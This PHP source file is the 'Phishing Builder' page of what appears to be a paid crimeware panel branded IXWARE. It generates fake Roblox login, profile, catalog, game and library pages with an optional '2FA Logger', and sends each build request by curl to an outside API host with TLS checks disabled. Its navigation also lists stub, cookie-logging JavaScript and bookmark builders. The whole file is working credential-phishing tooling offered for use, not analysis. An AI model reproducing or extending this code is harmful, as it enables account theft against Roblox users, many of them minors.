<?php 
      @session_start();
      $title = 'Phishing Builder';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';   
      include_once __DIR__.'/../vendor/autoload.php';

      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);
      
      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if(checkMaintenance() == 'Maintenance' && $getRank != "Admin"){
        header('Location: dashboard');
        die();
      }

    if($getRank != "Premium"){
      if($getRank != "Admin"){
        header('Location: dashboard');
        die();
      }
    }
    if($discordID == 0){
      header('Location: settings?id');
      die();
    }

    if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
    }
     

    if (isset($_POST['build'])){
      

      if (\Volnix\CSRF\CSRF::validate($_POST)) {

        if($getRank == "Premium" || $getRank == "Admin"){

          if(checkPS(htmlspecialchars($_SESSION['ID'])) == 2){
            $error = "You are only able to have two phishing links at the same time.";
          }
        }
        elseif($getRank == "User"){
          
          if(checkPS(htmlspecialchars($_SESSION['ID'])) == 3){
            $error = "You are only able to have three phishing link.";
          }
        }

        if(empty($error)){

          $type = htmlspecialchars($_POST['preBuilds']);
          $siteID = encrypt(htmlspecialchars($_POST['siteID']));
  
          if (empty($_POST['ToSCheck'])){
            $error = "You need to agree to the Terms of Service.";
          }
  
          if($type == "login"){
            if(empty($_POST['fileName'])){
              $error = "Please enter a fileName";
            }
            if (preg_match('/\s/', $_POST['fileName'])){
              $error = "You can't include a whitespace in your fileName!";
            }
            if (preg_match('/[^a-zA-Z\d]/', $_POST['fileName'])){
              $error = "You can't include special characters in the fileName";  
            }
          }else{
            if(empty($siteID)){
              $error = "Please enter a valid site ID";
            }
          }
  
          if (empty($_POST['redirect'])){
            $redirect = "https://roblox.com/";
          }else{
            $owned_urls_array = array('https://', 'http://', 'https://www.');
  
            if (preg_match('('.implode('|',$owned_urls_array).')', $_POST['redirect'])){
                $redirect = htmlspecialchars($_POST['redirect']);
            }else{
                $error = "Your redirect link isn't a valid link! You need to include 'https://' at the start of the link";
            }
          }
  
          if(empty($error)){
  
            $hash = encrypt(hash('sha256', '877692' . UnixTimeStamp()));
            $userID = encrypt(htmlspecialchars($_SESSION['ID']));
            $redirect = encrypt($redirect);
  
            if($type == "login"){
              $fileName = encrypt(htmlspecialchars($_POST['fileName']));
            }else {
              $fileName = encrypt("N/A");
            }

            if(!empty($_POST['2FA'])){
              $fa = encrypt("true");
            }else{
              $fa = encrypt("false");
            }
  
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,"https://rblx-api.com/pAPI.php");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, array("Security" => $hash, "preBuilds" => encrypt($type), "userID" => $userID, "redirect" => $redirect, "siteID" => $siteID, "fileName" => $fileName, "2fa" => $fa));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        
            $server_output = curl_exec($ch);
            curl_close($ch);
            //$output = decrypt($server_output);
  
            header("location: psBuilds");
            exit();
          }
        }
      }else{
        header("HTTP/1.1 401 Unauthorized");
        echo file_get_contents('includes/layout/error/401.php');
        die();
      }
    }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" class="same-size-logo" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link active' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Phishing Builder</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
<?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->


  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
            <div class="col-xl-4">
                <div class="card bg-dark">
                  <div class="card-body d-flex flex-column">
                      <ul class="nav md-pills pills-dark pills-secondary nav-justified d-flex flex-column mb-3">
                            <li class="nav-item">
                                <a class="nav-link active btn btn-transparent" data-toggle="tab" href="#builder" role="tab">Phishing Builder</a>
                            </li>
                        </ul>
                  </div>
                </div>
            </div>
            <div class="col-xl-8">
                <?php
                    if(!empty($error)){
                        echo '<div class="animated fadeIn ml-3">'.error(htmlspecialchars($error)).'</div>';
                    }
                    if(!empty($success)){
                        echo '<div class="animated fadeIn ml-3">'.success(htmlspecialchars($success)).'</div>';
                    }
                ?>
                <div class="card bg-dark">
                  <div class="card-body d-flex flex-column">
                        <?php
                            echo "<form class='md-form md-form-resized' method='POST'>
                            <div class='tab-content tab-content-resized text-white' id='pills-tabContent'>
                            <div class='tab-pane fade show active' id='builder' role='tabpanel'>
                                <p class='text-darkwhite mt-3 p-margin'>Phishing Type</p>
                                <select class='select' name='preBuilds'>
                                    <option value='login' class='text-white' selected>Roblox Login Page</option>
                                    <option value='profile' class='text-white'>Roblox Profile Page</option>
                                    <option value='catalog' class='text-white'>Roblox Catalog Page</option>
                                    <option value='game' class='text-white'>Roblox Game Page</option>
                                    <option value='library' class='text-white'>Roblox Library Page</option>
                                </select>
                                <!-- Material input -->
                                <div class='md-form mt-4'>
                                  <p class='text-darkwhite'>Site ID</p>
                                  <input type='text' id='siteID' placeholder='ID of the site' name='siteID' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                </div>
                                <!-- Material input -->
                                <div class='md-form mt-4'>
                                  <p class='text-darkwhite'>Redirect Link</p>
                                  <input type='text' id='redirect' placeholder='Redirect Link' name='redirect' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                </div>
                                <!-- Material input -->
                                <div class='md-form mt-4'>
                                  <p class='text-darkwhite'>File Name (for login page only)</p>
                                  <input type='text' id='fileName' placeholder='Redirect Link' name='fileName' class='form-control text-darkwhite' style='background-color: transparent !important;'>
                                </div>
                                <!-- Default checkbox -->
                                <div class='form-check ml-2 mt-5'>
                                    <input class='form-check-input mt-2' type='checkbox' value='2fa' id='2FA' name='2FA' />
                                    <label class='form-check-label mt-2' for='2FA'>Enable 2FA Logger</label>
                                </div>
                                <!-- Default checkbox -->
                                <div class='form-check ml-2 mb-2'>
                                    <input class='form-check-input mt-2' type='checkbox' value='tos' id='ToSCheck' name='ToSCheck' />
                                    <label class='form-check-label mt-2' for='ToSCheck'>I have read and I agree to the <a href='terms-of-service' target='_blank' class='text-primary'><b> Terms of Service</b></a></label>
                                </div>
                                <button id='load-button' type='submit' name='build' value='build' class='btn btn-outline-primary waves-effect mt-auto' style='width:100%;'>Build</button>
                                <input type='hidden' name='" . \Volnix\CSRF\CSRF::TOKEN_NAME . "' value='" . \Volnix\CSRF\CSRF::getToken() . "'/>
                              </div>
                            </div>
                        </form>";
                        ?>                    
                  </div>
                </div>
            </div>
        </div>
    </div>
  </main>
  <!--Main layout-->


  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>